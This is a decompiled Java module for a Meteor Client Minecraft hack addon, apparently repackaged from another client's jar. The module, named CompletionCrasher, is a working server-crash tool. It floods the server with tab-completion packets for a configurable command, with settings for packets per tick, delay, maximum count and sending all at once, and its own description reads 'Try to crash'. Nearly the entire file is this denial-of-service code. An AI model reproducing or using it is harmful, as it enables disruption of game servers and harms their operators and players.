/*    */ package net.poodleschool.poodleclient.poodleclient.modules;
/*    */ import meteordevelopment.meteorclient.events.world.TickEvent;
/*    */ import meteordevelopment.meteorclient.settings.BoolSetting;
/*    */ import meteordevelopment.meteorclient.settings.IntSetting;
/*    */ import meteordevelopment.meteorclient.settings.Setting;
/*    */ import meteordevelopment.meteorclient.settings.SettingGroup;
/*    */ import meteordevelopment.meteorclient.settings.StringSetting;
/*    */ import meteordevelopment.meteorclient.systems.modules.Module;
/*    */ import net.minecraft.class_2596;
/*    */ import net.minecraft.class_2805;
/*    */ 
/*    */ public class CompletionCrasher extends Module {
/* 13 */   private int currDelay = 0;
/*    */   private int id;
/* 15 */   private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
/*    */   
/* 17 */   private final Setting<Integer> amount = this.sgGeneral.add((Setting)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder())
/* 18 */       .name("amount"))
/* 19 */       .description("Completions per Tick"))
/* 20 */       .min(1)
/* 21 */       .sliderRange(1, 20)
/* 22 */       .defaultValue(Integer.valueOf(5)))
/* 23 */       .build());
/*    */ 
/*    */   
/* 26 */   private final Setting<Integer> delay = this.sgGeneral.add((Setting)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder())
/* 27 */       .name("delay"))
/* 28 */       .description("The Delay"))
/* 29 */       .min(1)
/* 30 */       .sliderRange(1, 20)
/* 31 */       .defaultValue(Integer.valueOf(10)))
/* 32 */       .build());
/*    */ 
/*    */   
/* 35 */   private final Setting<String> bypassCommand = this.sgGeneral.add((Setting)((StringSetting.Builder)((StringSetting.Builder)((StringSetting.Builder)(new StringSetting.Builder())
/* 36 */       .name("command"))
/* 37 */       .description("The Command used to complete"))
/* 38 */       .defaultValue("/skill a"))
/* 39 */       .build());
/*    */ 
/*    */   
/* 42 */   private final Setting<Boolean> sendAtOnce = this.sgGeneral.add((Setting)((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)(new BoolSetting.Builder())
/* 43 */       .name("sendAtOnce"))
/* 44 */       .description("Send them all at once"))
/* 45 */       .defaultValue(Boolean.valueOf(false)))
/* 46 */       .build());
/*    */ 
/*    */   
/* 49 */   private final Setting<Integer> maxAmount = this.sgGeneral.add((Setting)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder())
/* 50 */       .name("max"))
/* 51 */       .description("The max amount of packets"))
/* 52 */       .defaultValue(Integer.valueOf(500)))
/* 53 */       .build());
/*    */ 
/*    */   
/*    */   public CompletionCrasher() {
/* 57 */     super(Addon.CATEGORY, "completion-crasher", "Try to crash");
/*    */   }
/*    */ 
/*    */   
/*    */   public void onActivate() {
/* 62 */     this.currDelay = 0;
/* 63 */     this.id = 0;
/* 64 */     if (((Boolean)this.sendAtOnce.get()).booleanValue()) {
/* 65 */       for (int i = 0; i < ((Integer)this.maxAmount.get()).intValue(); i++) {
/* 66 */         this.id++;
/* 67 */         if (this.id >= ((Integer)this.maxAmount.get()).intValue()) {
/* 68 */           toggle();
/*    */           return;
/*    */         } 
/* 71 */         this.mc.method_1562().method_52787((class_2596)new class_2805(this.id, (String)this.bypassCommand.get()));
/*    */       } 
/* 73 */       toggle();
/*    */     } 
/*    */   }
/*    */   
/*    */   @EventHandler
/*    */   public void onTick(TickEvent.Post ignored) {
/* 79 */     if (this.currDelay > 0) {
/* 80 */       this.currDelay--;
/*    */       
/*    */       return;
/*    */     } 
/* 84 */     this.currDelay = ((Integer)this.delay.get()).intValue();
/*    */     
/* 86 */     for (int i = 0; i < ((Integer)this.amount.get()).intValue(); i++) {
/* 87 */       this.id++;
/* 88 */       if (this.id >= ((Integer)this.maxAmount.get()).intValue()) {
/* 89 */         toggle();
/*    */         return;
/*    */       } 
/* 92 */       this.mc.method_1562().method_52787((class_2596)new class_2805(this.id, (String)this.bypassCommand.get()));
/*    */     } 
/*    */   }
/*    */ }


/* Location:              /Users/iangoss/Downloads/navine-3.2.8.jar!/de/Jakob/navine/modules/CompletionCrasher.class
 * Java compiler version: 17 (61.0)
 * JD-Core Version:       1.1.3
 */